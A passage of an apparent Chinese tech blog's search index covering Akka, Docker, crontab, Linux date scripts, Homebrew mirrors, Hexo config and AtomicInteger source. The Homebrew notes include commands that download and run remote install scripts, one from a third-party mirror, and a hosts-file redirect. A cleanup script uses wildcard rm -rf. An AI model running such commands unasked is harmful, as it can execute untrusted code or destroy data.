业务侧捕获异常，异常产生可能会造成actor重启或者关闭，期间出现消息丢失 发送消息 确保不丢消息的情况下 同步：可以采用ask同步，加重试 异步：可采用ask异步，加重试 提高吞吐量 采用tell模式 携带发送者转发 forward 消息回复 建议用actorSelection.tell回复，可以保证重启后消息不丢失。 网络 关闭链接复用，在重启的特定的情况下会存在链接与actor关联失败情况 死信处理 监控系统消息发送或者接受失败，可观察现有信息送达状态，降低无效的资源消耗及错误逻辑，发现潜在问题 解决系统中非重启出现的deadletter 线程处理 actor并发处理，减少公共成员变量访问 Actor状态管理 非特殊需要禁止管理远程actor状态，错误操作可能造成对端akkaSystem异常参考 https://zhuanlan.zhihu.com/p/38662453https://doc.akka.io/docs/akka/current/remoting.html#lifecycle-and-failure-recovery-modelhttps://www.cnblogs.com/tankaixiong/p/11225259.htmlhttp://doc.yonyoucloud.com/doc/akka-doc-cn/2.3.6/scala/book/chapter1/01_what_is_akka.html","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"镜像的导出和导入","slug":"devops/docker/docker镜像和容器导入导出","date":"2021-11-12T11:15:44.108Z","updated":"2021-11-12T11:18:28.038Z","comments":true,"path":"2021/11/12/devops/docker/docker镜像和容器导入导出/","link":"","permalink":"https://wuhaocn.github.io/2021/11/12/devops/docker/docker%E9%95%9C%E5%83%8F%E5%92%8C%E5%AE%B9%E5%99%A8%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/","excerpt":"","text":"1. 镜像的导出和导入1.1.镜像的保存12345678910[root@k8s-master ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEnginx latest ae513a47849c 2 months ago 109MBdebian jessie 4eb8376dc2a3 2 months ago 127MBrabbitmq 3.6.8 8cdcbee37f62 15 months ago 179MB[root@k8s-master tmp]# docker save ae513a47849c &gt; nginx-save.tar[root@k8s-master tmp]# ls -lhtotal 108M-rw-r--r-- 1 root root 108M Jul 4 09:32 nginx-save.tar 另一种写法 1docker save -o nginx-save.tar ae513a47849c 1.2.镜像的导入可以将导出的nginx-save.tar包传到需要的docker主机上面，然后执行导入命令. 1234567[root@k8s-master tmp]# ls -lhtotal 108M-rw-r--r-- 1 root root 108M Jul 4 09:32 nginx-save.tar[root@k8s-master tmp]# docker load &lt; nginx-save.tar 82b81d779f83: Loading layer [==================================================&gt;] 54.21MB/54.21MB7ab428981537: Loading layer [==================================================&gt;] 3.584kB/3.584kBLoaded image ID: sha256:ae513a47849c895a155ddfb868d6ba247f60240ec8495482eca74c4a2c13a881 另一种种写法： 1docker load -i nginx-save.tar 2.容器的导出和导入2.1.容器的导出1234[root@k8s-master tmp]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES220aee82cfea tomcat:7 &quot;catalina.sh run&quot; 9 seconds ago Up 7 seconds 8080/tcp tomcat7docker export -o mysql-`date +%Y%m%d`.tar 220aee82cfea 2.2.容器的导入1docker import my_ubuntu_v3.tar runoob/ubuntu:v4 镜像和容器 导出和导入的区别: 镜像导入 是复制的过程 容器导入 是将当前容器 变成一个新的镜像 save 和 export区别： save 保存镜像所有的信息-包含历史 export 只导出当前的信息","categories":[{"name":"devops","slug":"devops","permalink":"https://wuhaocn.github.io/categories/devops/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wuhaocn.github.io/tags/docker/"}]},{"title":"Linux定时任务用法与实例","slug":"language/shell/Linux定时任务用法与实例","date":"2021-10-18T03:19:43.244Z","updated":"2021-10-18T03:35:26.285Z","comments":true,"path":"2021/10/18/language/shell/Linux定时任务用法与实例/","link":"","permalink":"https://wuhaocn.github.io/2021/10/18/language/shell/Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E7%94%A8%E6%B3%95%E4%B8%8E%E5%AE%9E%E4%BE%8B/","excerpt":"","text":"1.简介** 在**Linux系统的实际使用中，可能会经常碰到让系统在某个特定时间执行某些任务的情况，比如定时采集服务器的状态信息、负载状况；定时执行某些任务/脚本来对远端进行数据采集等。这里将介绍下crontab的配置参数以及一些使用实例。​ crontab配置文件Linux下的任务调度分为两类：系统任务调度和用户任务调度。Linux系统任务是由 cron (crond) 这个系统服务来控制的，这个系统服务是默认启动的。用户自己设置的计划任务则使用crontab 命令。 2.常见配置2.1 配置详情1cat /etc/crontab 1234567891011121314# /etc/crontab: system-wide crontab# Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user command17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly ) 2.2 crontab格式 在以上各个字段中，还可以使用以下特殊字符： 12345&quot;*&quot;代表所有的取值范围内的数字，如月份字段为*，则表示1到12个月；&quot;/&quot;代表每一定时间间隔的意思，如分钟字段为*/10，表示每10分钟执行1次。&quot;-&quot;代表从某个区间范围，是闭区间。如“2-5”表示“2,3,4,5”，小时字段中0-23/2表示在0~23点范围内每2个小时执行一次。&quot;,&quot;分散的数字（不一定连续），如1,2,3,4,7,9。注：由于各个地方每周第一天不一样，因此Sunday=0（第一天）或Sunday=7（最后1天）。 crontab命令详解 2.3 配置文件​ 其一：/var/spool/cron/该目录下存放的是每个用户（包括root）的crontab任务，文件名以用户名命名 其二：/etc/cron.d/这个目录用来存放任何要执行的crontab文件或脚本。3.服务状态​ 启动服务 sudo service cron start 关闭服务 sudo service cron stop 重启服务 sudo service cron restart 重新载入配置 sudo service cron reload 查看服务状态 sudo service cron status 4.常见命令 重新指定crontab定时任务列表文件 crontab $filepath 查看crontab定时任务 crontab -l 编辑定时任务【删除-添加-修改】 crontab -e 添加定时任务【推荐】Step-One : 编辑任务脚本【分目录存放】【ex: backup.sh】Step-Two : 编辑定时文件【命名规则:backup.cron】Step-Three : crontab命令添加到系统crontab backup.cronStep-Four : 查看crontab列表 crontab -l 5.crontab时间举例规则1234567891011121314151617181920212223242526每一分钟执行一次command（因cron默认每1分钟扫描一次，因此全为*即可）* * * * * command每小时的第3和第15分钟执行command3,15 * * * * command每天上午8-11点的第3和15分钟执行command：3,15 8-11 * * * command每隔2天的上午8-11点的第3和15分钟执行command：3,15 8-11 */2 * * command每个星期一的上午8点到11点的第3和第15分钟执行command3,15 8-11 * * 1 command每晚的21:30重启smb30 21 * * * /etc/init.d/smb restart每月1、10、22日的4 : 45重启smb45 4 1,10,22 * * /etc/init.d/smb restart每周六、周日的1 : 10重启smb10 1 * * 6,0 /etc/init.d/smb restart每天18 : 00至23 : 00之间每隔30分钟重启smb0,30 18-23 * * * /etc/init.d/smb restart每一小时重启smb* */1 * * * /etc/init.d/smb restart晚上11点到早上7点之间，每隔一小时重启smb* 23-7/1 * * * /etc/init.d/smb restart每月的4号与每周一到周三的11点重启smb0 11 4 * mon-wed /etc/init.d/smb restart每小时执行/etc/cron.hourly目录内的脚本0 1 * * * root run-parts /etc/cron.hourly crontab配置实例 举例12345678910111213141516171819202122232425262728293031323334353637383940414243# 每天早上6点 0 6 * * * echo &quot;Good morning.&quot; &gt;&gt; /tmp/test.txt //注意单纯echo，从屏幕上看不到任何输出，因为cron把任何输出都email到root的信箱了。# 每两个小时 0 */2 * * * echo &quot;Have a break now.&quot; &gt;&gt; /tmp/test.txt # 晚上11点到早上8点之间每两个小时和早上八点 0 23-7/2，8 * * * echo &quot;Have a good dream&quot; &gt;&gt; /tmp/test.txt# 每个月的4号和每个礼拜的礼拜一到礼拜三的早上11点 0 11 4 * 1-3 command line# 1月1日早上4点 0 4 1 1 * command line SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=root //如果出现错误，或者有数据输出，数据作为邮件发给这个帐号 HOME=/ # 每小时（第一分钟）执行/etc/cron.hourly内的脚本01 * * * * root run-parts /etc/cron.hourly# 每天（凌晨4：02）执行/etc/cron.daily内的脚本02 4 * * * root run-parts /etc/cron.daily # 每星期（周日凌晨4：22）执行/etc/cron.weekly内的脚本22 4 * * 0 root run-parts /etc/cron.weekly # 每月（1号凌晨4：42）去执行/etc/cron.monthly内的脚本 42 4 1 * * root run-parts /etc/cron.monthly # 注意: &quot;run-parts&quot;这个参数了，如果去掉这个参数的话，后面就可以写要运行的某个脚本名，而不是文件夹名。 # 每天的下午4点、5点、6点的5 min、15 min、25 min、35 min、45 min、55 min时执行命令。 5，15，25，35，45，55 16，17，18 * * * command# 每周一，三，五的下午3：00系统进入维护状态，重新启动系统。00 15 * *1，3，5 shutdown -r +5# 每小时的10分，40分执行用户目录下的innd/bbslin这个指令： 10，40 * * * * innd/bbslink # 每小时的1分执行用户目录下的bin/account这个指令： 1 * * * * bin/account# 每天早晨三点二十分执行用户目录下如下所示的两个指令（每个指令以;分隔）： 203 * * * （/bin/rm -f expire.ls logins.bad;bin/expire$#@62;expire.1st）","categories":[{"name":"linux","slug":"linux","permalink":"https://wuhaocn.github.io/categories/linux/"}],"tags":[]},{"title":"Linux日期获取","slug":"language/shell/Linux日期获取","date":"2021-10-18T03:19:29.345Z","updated":"2021-10-18T03:35:26.271Z","comments":true,"path":"2021/10/18/language/shell/Linux日期获取/","link":"","permalink":"https://wuhaocn.github.io/2021/10/18/language/shell/Linux%E6%97%A5%E6%9C%9F%E8%8E%B7%E5%8F%96/","excerpt":"","text":"1.linux获取日期 linux中通过date命令获取昨天或明天时间的方法. date命令可以获取当前的时间，通过man，可以看到date有很多参数可以用，很容易做到格式化 12345date +&quot;%F&quot;输出格式：2011-12-31 date +&quot;%F %H:%M:%S&quot;输出格式：2011-12-31 16:29:50 这都是打印出系统的当前时间，如果要获取相对当前时间的某个时间，需要怎么做，通过 -d 参数就能实现。例如：​ 12345date -d&quot;tomorrow&quot; +&quot;%F %H:%M:%S&quot;输出明天这个时候的时间date -d&quot;yesterday&quot; +&quot;%F %H:%M:%S&quot;输出昨天这个时候的时间 如果说我想获取13天前的时间怎么办，-d参数还有更加灵活的用法，例如： 123456789date -d&quot;-1 day ago&quot; +&quot;%F %H:%M:%S&quot;输出明天这个时候的时间date -d&quot;1 day ago&quot; +&quot;%F %H:%M:%S&quot;输出昨天这个时候的时间date -d&quot;1 week ago&quot; +&quot;%F %H:%M:%S&quot;输出7天前这个时候的时间，等价于date -d&quot;7 day ago&quot; +&quot;%F %H:%M:%S&quot; 可以看到ago的强大了吧，第一个数字可以是负数，负数表示将来时间，正数表示前面已经过去的时间，第二个参数minute、hour、day、month、week。 2.使用实例 定时删除三天前类似”2021_10_18_09”文件 编写shell脚本”clean_tcpdump.sh” 12345678910111213#!/bin/bashdumpfile3=`date -d&quot;3 day ago&quot; &#x27;+%Y_%m_%d&#x27;`*echo $dumpfile3dumpfile3del=&quot;$dumpfile3*&quot; rm -rf $dumpfile3deldumpfile4=`date -d&quot;4 day ago&quot; &#x27;+%Y_%m_%d&#x27;`*echo $dumpfile4dumpfile4del=&quot;$dumpfile4*&quot; rm -rf $dumpfile4deldumpfile5=`date -d&quot;5 day ago&quot; &#x27;+%Y_%m_%d&#x27;`*echo $dumpfile5dumpfile5del=&quot;$dumpfile5*&quot; rm -rf $dumpfile5del 暴力一点部署特别优雅，其实可以用循环 3.参考：https://blog.csdn.net/qq_16885135/article/details/52063477","categories":[{"name":"linux","slug":"linux","permalink":"https://wuhaocn.github.io/categories/linux/"}],"tags":[]},{"title":"brew常用设置","slug":"tool/mac/brew常用设置","date":"2021-10-15T06:08:00.262Z","updated":"2021-10-15T06:30:00.475Z","comments":true,"path":"2021/10/15/tool/mac/brew常用设置/","link":"","permalink":"https://wuhaocn.github.io/2021/10/15/tool/mac/brew%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE/","excerpt":"","text":"1.brew更新or安装慢 更新ustc.edu源并设置强制更新 1234567891011cd $(brew --repo) git remote set-url origin https://mirrors.ustc.edu.cn/brew.git cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-core&quot; git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.gitexport HOMEBREW_FORCE_BREWED_GIT=&quot;1&quot; 更新github源并设置强制更新 1234567建议配置ssh快一些cd $(brew --repo)git clone git remote set-url origin git@github.com:Homebrew/brew.gitcd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-core&quot;git remote set-url origin git@github.com:Homebrew/homebrew-core.gitexport HOMEBREW_FORCE_BREWED_GIT=&quot;1&quot; 2.brew重启安装12345678910111213141516171819202122232425261、卸载ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)&quot;2、安装【卸载与安装差别只有最后的install和undeinstall】ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;3、更新brew update 遇到问题：1、raw.githubusercontent.com 链接不到或者访问太慢解决：绑定host199.232.28.133 raw.githubusercontent.com有host修改软件，直接在软件修改即可没有的按照如下方式修改追加sudo vim /etc/hosts在hosts文件最后追加如下，保存退出即可：199.232.28.133 raw.githubusercontent.com 3.常见命令1234567891011121314151617181920安装软件：brew install 软件名，例：brew install wget搜索软件：brew search 软件名，例：brew search wget卸载软件：brew uninstall 软件名，例：brew uninstall wget更新所有软件：brew update更新具体软件：brew upgrade 软件名 ，例：brew upgrade git显示已安装软件：brew list查看软件信息：brew info／home 软件名 ，例：brew info git ／ brew home git显示包依赖：brew reps显示安装的服务：brew services list安装服务启动、停止、重启：brew services start/stop/restart serverName 全部替换国内源1/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;","categories":[{"name":"devops","slug":"devops","permalink":"https://wuhaocn.github.io/categories/devops/"}],"tags":[{"name":"brew","slug":"brew","permalink":"https://wuhaocn.github.io/tags/brew/"}]},{"title":"docker常用命令","slug":"devops/docker/docker常用命令","date":"2021-10-14T02:20:08.920Z","updated":"2021-10-18T04:11:47.492Z","comments":true,"path":"2021/10/14/devops/docker/docker常用命令/","link":"","permalink":"https://wuhaocn.github.io/2021/10/14/devops/docker/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"","text":"组合命令 模糊删除镜像 1docker rmi --force `docker images | grep java | awk &#x27;&#123;print $3&#125;&#x27;` 删除停止容器 1docker rm `docker ps -a -q` 停止/启动容器 12docker start $(docker ps -a | awk &#x27;&#123; print $1&#125;&#x27; | tail -n +2)docker stop $(docker ps -a | awk &#x27;&#123; print $1&#125;&#x27; | tail -n +2) 提交容器 1234567docker commit 81a82e9b5ac2 wuhaocn/java-im:8docker tag wuhaocn/java-im:8 wuhaocn/java-im:8docker push wuhaocn/java-im:8 常用命令容器生命周期管理 run 12运行容器docker run -p 80:80 -v /data:/data -d nginx:latest start/stop/restart 1234启动/停止/重启容器docker start myrunoob kill 1234杀死容器docker kill -s KILL myrunoob rm 1234删除容器docker rm -f myrunoob1 myrunoob2 pause/unpause 12暂停数据库容器myrunoob提供服务docker pause myrunoob create 12使用docker镜像nginx:latest创建一个容器,并将容器命名为myrunoobdocker create --name myrunoob nginx:latest exec 12通过 exec 命令对指定的容器执行 bash:docker exec -it 9df70f9a0714 /bin/bash 容器操作 ps 12345列出容器runoob@runoob:~$ docker psCONTAINER ID IMAGE COMMAND ... PORTS NAMES09b93464c2f7 nginx:latest &quot;nginx -g &#x27;daemon off&quot; ... 80/tcp, 443/tcp myrunoob inspect 12获取镜像mysql:5.6的元信息。docker inspect mysql:5.6 top 1234查看容器mymysql的进程信息。docker top mymysql查看所有运行容器的进程信息。for i in `docker ps |grep Up|awk &#x27;&#123;print $1&#125;&#x27;`;do echo \\ &amp;&amp;docker top $i; done attach 12容器mynginx将访问日志指到标准输出，连接到容器查看访问信息。docker attach --sig-proxy=false mynginx events 1234显示docker 2016年7月1日后的所有事件。docker events --since=&quot;1467302400&quot;显示docker 镜像为mysql:5.6 2016年7月1日后的相关事件。docker events -f &quot;image&quot;=&quot;mysql:5.6&quot; --since=&quot;1467302400&quot; logs 12345跟踪查看容器mynginx的日志输出。docker logs -f mynginx查看容器mynginx从2016年7月1日后的最新10条日志。docker logs --since=&quot;2016-07-01&quot; --tail=10 mynginx wait 1234docker wait : 阻塞运行直到容器停止，然后打印出它的退出代码。docker wait CONTAINER export 12345将id为a404c6c174a2的容器按日期保存为tar文件。runoob@runoob:~$ docker export -o mysql-`date +%Y%m%d`.tar a404c6c174a2runoob@runoob:~$ ls mysql-`date +%Y%m%d`.tarmysql-20160711.tar port 12345查看容器mynginx的端口映射情况。docker port mymysql3306/tcp -&gt; 0.0.0.0:3306 容器rootfs命令 commit 1234将容器a404c6c174a2 保存为新的镜像,并添加提交人信息和说明信息。docker commit -a &quot;runoob.com&quot; -m &quot;my apache&quot; a404c6c174a2 mymysql:v1简化参考docker commit faa474c052c6 java-sctp:8 cp 123将主机/www/runoob目录拷贝到容器96f7f14e99ab的/www目录下。docker cp /www/runoob 96f7f14e99ab:/www/ diff 1234567891011查看容器mymysql的文件结构更改。runoob@runoob:~$ docker diff mymysqlA /logsA /mysql_dataC /runC /run/mysqldA /run/mysqld/mysqld.pidA /run/mysqld/mysqld.sockC /tmp 镜像仓库 login 123登陆到Docker Hubdocker login -u 用户名 -p 密码 pull 123从Docker Hub下载java最新版镜像。docker pull java push 123上传本地镜像myapache:v1到镜像仓库中。docker push myapache:v1 search 1234从 Docker Hub 查找所有镜像名包含 java，并且收藏数大于 10 的镜像docker search -f stars=10 java 本地镜像管理 images 12345查看本地镜像列表。runoob@runoob:~$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEmymysql v1 37af1236adef 5 minutes ago 329 MB rmi 1234强制删除本地镜像 runoob/ubuntu:v4。 docker rmi -f runoob/ubuntu:v4Untagged: runoob/ubuntu:v4 tag 123将镜像ubuntu:15.10标记为 runoob/ubuntu:v3 镜像。docker tag ubuntu:15.10 runoob/ubuntu:v3 build 123使用当前目录的 Dockerfile 创建镜像，标签为 runoob/ubuntu:v1。docker build -t runoob/ubuntu:v1 . history 12345678查看本地镜像runoob/ubuntu:v3的创建历史。root@runoob:~# docker history runoob/ubuntu:v3IMAGE CREATED CREATED BY SIZE COMMENT4e3b13c8a266 3 months ago /bin/sh -c #(nop) CMD [&quot;/bin/bash&quot;] 0 B &lt;missing&gt; 3 months ago /bin/sh -c sed -i &#x27;s/^#\\s*\\(deb.*universe\\)$/ 1.863 kB &lt;missing&gt; 3 months ago /bin/sh -c set -xe &amp;&amp; echo &#x27;#!/bin/sh&#x27; &gt; /u 701 B &lt;missing&gt; 3 months ago /bin/sh -c #(nop) ADD file:43cb048516c6b80f22 136.3 MB save 123456将镜像 runoob/ubuntu:v3 生成 my_ubuntu_v3.tar 文档runoob@runoob:~$ docker save -o my_ubuntu_v3.tar runoob/ubuntu:v3runoob@runoob:~$ ll my_ubuntu_v3.tar-rw------- 1 runoob runoob 142102016 Jul 11 01:37 my_ubuntu_v3.ta load 123导入镜像：$ docker load &lt; busybox.tar.gzLoaded image: busybox:latest import 1234A:export/import 是根据容器来导出镜像（因此没有镜像的历史记录）而 save/load 操作的对象是镜像B:export/import 镜像的历史记录再导后无法进行回滚操作，而save/load镜像有完整的历史记录可以回滚docker import : 从归档文件中创建镜像。docker import my_ubuntu_v3.tar runoob/ubuntu:v4 系统信息 info 12345678910111213141516$ docker infoContainers: 12Images: 41Storage Driver: aufs Root Dir: /var/lib/docker/aufs Backing Filesystem: extfs Dirs: 66 Dirperm1 Supported: falseExecution Driver: native-0.2Logging Driver: json-fileKernel Version: 3.13.0-32-genericOperating System: Ubuntu 14.04.1 LTSCPUs: 1Total Memory: 1.954 GiBName: iZ23mtq8bs1ZID: M5N4:K6WN:PUNC:73ZN:AONJ:AUHL:KSYH:2JPI:CH3K:O4MK:6OCX:5OYW version 1234567891011121314151617显示 Docker 版本信息。$ docker versionClient: Version: 1.8.2 API version: 1.20 Go version: go1.4.2 Git commit: 0a8c2e3 Built: Thu Sep 10 19:19:00 UTC 2015 OS/Arch: linux/amd64Server: Version: 1.8.2 API version: 1.20 Go version: go1.4.2 Git commit: 0a8c2e3 Built: Thu Sep 10 19:19:00 UTC 2015 OS/Arch: linux/amd64","categories":[{"name":"devops","slug":"devops","permalink":"https://wuhaocn.github.io/categories/devops/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wuhaocn.github.io/tags/docker/"}]},{"title":"hexo-配置","slug":"tool/hexo-config","date":"2021-10-01T13:12:11.461Z","updated":"2021-10-01T13:12:11.461Z","comments":true,"path":"2021/10/01/tool/hexo-config/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/tool/hexo-config/","excerpt":"","text":"hexo配置详解，包含分类，归档，标题等 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495# Sitetitle: #主页标题subtitle: #副标题description: #网站描述description主要用于SEOkeywords: #博客关键字author: #作者，左下角显示language: zh_Hans # 选择中文简体timezone: &#x27;Asia/Shanghai&#x27; #时区:国内选择上海# Urlurl: http://yoursite.com #填自己的github pages网址 root: / #网站根目录permalink: :year/:month/:day/:title/ #文章的 永久链接 格式permalink_defaults: #永久链接中各部分的默认值pretty_urls: #改写 permalink 的值来美化 URLtrailing_index: false # 比如，一个页面的永久链接是 https://wuhaocn.github.io/foo/bar/index.html 是否在 永久链接中保留尾部的 index.html，设置为 false 时去除trailing_html: true #是否在永久链接中保留尾部.html, 设置为 false 时去除# Directorysource_dir: source #资源文件夹，这个文件夹用来存放内容。public_dir: public #公共文件夹，这个文件夹用于存放生成的站点文件。tag_dir: tags #标签文件夹archive_dir: archives #归档文件夹category_dir: categories #分类文件夹code_dir: downloads/code #Include code 文件夹，source_dir 下的子目录i18n_dir: :lang #国际化（i18n）文件夹skip_render: #跳过指定文件的渲染。匹配到的文件将会被不做改动地复制到 public 目录中。您可 使用 glob 表达式来匹配路径。# Writingnew_post_name: :year-:month-:day-:title.md #生成yyyy-MM-dd-博文名称的名称有助于我们管理自己的博 文。 default_layout: post #预设布局titlecase: false #把标题转换为 title caseexternal_link: #在新标签中打开链接 enable: true #在新标签中打开链接 field: site #对整个网站（site）生效或仅对文章（post）生效 exclude: &#x27;&#x27; #需要排除的域名。主域名和子域名如 www 需分别配置filename_case: 0 #把文件名称转换为 (1) 小写或 (2) 大写render_drafts: false #显示草稿post_asset_folder: false #启动 Asset 文件夹 new 文件的同时，xxxx.md文件还有一个同名的文件夹relative_link: false #把链接改为与根目录的相对位址future: true #显示未来的文章highlight: enable: true #开启代码块高亮 line_number: true #显示行数 auto_detect: false #如果未指定语言，则启用自动检测 tab_replace: &#x27;&#x27; #用 n 个空格替换 tabs；如果值为空，则不会替换 tabs wrap: true # 将代码块包装到&lt;table&gt; hljs: false # CSS类使用hljs-*前缀# Home page setting# path: Root path for your blogs index page. (default = &#x27;&#x27;)# per_page: Posts displayed per page. (0 = disable pagination)# order_by: Posts order. (Order by date descending by default)index_generator: path: &#x27;&#x27; per_page: 10 order_by: -date# Category &amp; Tagdefault_category: uncategorized #默认分类category_map: #分类别名tag_map: #标签别名# Metadata elementsmeta_generator: true # Meta generator 标签。 值为 false 时 Hexo 不会在头部插入该标签# Date / Time format## Hexo uses Moment.js to parse and display date Hexo 使用 Moment.js 来解析和显示时间## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DD #日期格式time_format: HH:mm:ss #时间格式use_date_for_updated: false #启用以后，如果Front Matter中没有指定 updated， post.updated 将会使用date的值而不是文件的创建时间。在Git工作流中这个选项会很有用# Pagination## Set per_page to 0 to disable paginationper_page: 10 #每页显示的文章量 (0 = 关闭分页功能)pagination_dir: page #分页目录# Include / Exclude file(s)## include:/exclude: options only apply to the &#x27;source/&#x27; folderinclude: #Hexo 默认会忽略隐藏文件和文件夹（包括名称以下划线和 . 开头的文件和文件夹，Hexo 的 _posts 和 _data 等目录除外）。通过设置此字段将使 Hexo 处理他们并将它们复制到 source 目录下。exclude: #Hexo 会忽略这些文件和目录ignore: #Ignore files/folders# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: icarus #当前主题名称。值为false时禁用主题# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: #部署部分的设置 type: git repo: https://github.com/CodePandaes/CodePandaes.github.io.git #github中仓库地址 branch: master","categories":[],"tags":[]},{"title":"AtomicInteger","slug":"language/java/juc/atomic/AtomicInteger","date":"2021-10-01T13:12:11.460Z","updated":"2021-10-01T13:12:11.460Z","comments":true,"path":"2021/10/01/language/java/juc/atomic/AtomicInteger/","link":"","permalink":"https://wuhaocn.github.io/2021/10/01/language/java/juc/atomic/AtomicInteger/","excerpt":"","text":"源码导读AtomicInteger，应该是atomic框架中用得最多的原子类了。顾名思义， AtomicInteger是Integer类型的线程安全原子类，可以在应用程序中以原子的方式更新int值。 采用volatile int value类型原子变量保证内存可见性 采用Unsafe类 compareAndSwapInt方法实现变量值valueOffset的修改 知识参考点：Unsafe类/ volatile 关键字/ CAS 源码参考123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309/* * ORACLE PROPRIETARY/CONFIDENTIAL. Use is subject to license terms. * * Written by Doug Lea with assistance from members of JCP JSR-166 * Expert Group and released to the public domain, as explained at * http://creativecommons.org/publicdomain/zero/1.0/ */package java.util.concurrent.atomic;import java.util.function.IntUnaryOperator;import java.util.function.IntBinaryOperator;import sun.misc.Unsafe;/** * An &#123;@code int&#125; value that may be updated atomically. See the * &#123;@link java.util.concurrent.atomic&#125; package specification for * description of the properties of atomic variables. An * &#123;@code AtomicInteger&#125; is used in applications such as atomically * incremented counters, and cannot be used as a replacement for an * &#123;@link java.lang.Integer&#125;. However, this class does extend * &#123;@code Number&#125; to allow uniform access by tools and utilities that * deal with numerically-based classes. * * @since 1.5 * @author Doug Lea*/public class AtomicInteger extends Number implements java.io.Serializable &#123; private static final long serialVersionUID = 6214790243416807050L; // setup to use Unsafe.compareAndSwapInt for updates private static final Unsafe unsafe = Unsafe.getUnsafe(); private static final long valueOffset; static &#123; try &#123; valueOffset = unsafe.objectFieldOffset (AtomicInteger.class.getDeclaredField(&quot;value&quot;)); &#125; catch (Exception ex) &#123; throw new Error(ex); &#125; &#125; private volatile int value; /** * Creates a new AtomicInteger with the given initial value. * * @param initialValue the initial value */ public AtomicInteger(int initialValue) &#123; value = initialValue; &#125; /** * Creates a new AtomicInteger with initial value &#123;@code 0&#125;. */ public AtomicInteger() &#123; &#125; /** * Gets the current value. * * @return the current value */ public final int get() &#123; return value; &#125; /** * Sets to the given value. * * @param newValue the new value */ public final void set(int newValue) &#123; value = newValue; &#125; /** * Eventually sets to the given value. * * @param newValue the new value * @since 1.6 */ public final void lazySet(int newValue) &#123; unsafe.putOrderedInt(this, valueOffset, newValue); &#125; /** * Atomically sets to the given value and returns the old value. * * @param newValue the new value * @return the previous value */ public final int getAndSet(int newValue) &#123; return unsafe.getAndSetInt(this, valueOffset, newValue); &#125; /** * Atomically sets the value to the given updated value * if the current value &#123;@code ==&#125; the expected value. * * @param expect the expected value * @param update the new value * @return &#123;@code true&#125; if successful. False return indicates that * the actual value was not equal to the expected value. */ public final boolean compareAndSet(int expect, int update) &#123; return unsafe.compareAndSwapInt(this, valueOffset, expect, update); &#125; /** * Atomically sets the value to the given updated value * if the current value &#123;@code ==&#125; the expected value. * * &lt;p&gt;&lt;a href=&quot;package-summary.html#weakCompareAndSet&quot;&gt;May fail * spuriously and does not provide ordering guarantees&lt;/a&gt;, so is * only rarely an appropriate alternative to &#123;@code compareAndSet&#125;. * * @param expect the expected value * @param update the new value * @return &#123;@code true&#125; if successful */ public final boolean weakCompareAndSet(int expect, int update) &#123; return unsafe.compareAndSwapInt(this, valueOffset, expect, update); &#125; /** * Atomically increments by one the current value. * * @return the previous value */ public final int getAndIncrement() &#123; return unsafe.getAndAddInt(this, valueOffset, 1); &#125; /** * Atomically decrements by one the current value. * * @return the previous value */ public final int getAndDecrement() &#123; return unsafe.getAndAddInt(this, valueOffset, -1); &#125; /** * Atomically adds the given value to the current value. * * @param delta the value to add * @return the previous value */ public final int getAndAdd(int delta) &#123; return unsafe.getAndAddInt(this, valueOffset, delta); &#125; /** * Atomically increments by one the current value. * * @return the updated value */ public final int incrementAndGet() &#123; return unsafe.getAndAddInt(this, valueOffset, 1) + 1; &#125; /** * Atomically decrements by one the current value. * * @return the updated value */ public final int decrementAndGet() &#123; return unsafe.getAndAddInt(this, valueOffset, -1) - 1; &#125; /** * Atomically adds the given value to the current value. * * @param delta the value to add * @return the updated value */ public final int addAndGet(int delta) &#123; return unsafe.getAndAddInt(this, valueOffset, delta) + delta; &#125; /** * Atomically updates the current value with the results of * applying the given function, returning the previous value. The * function should be side-effect-free, since it may be re-applied * when attempted updates fail due to contention among threads. * * @param updateFunction a side-effect-free function * @return the 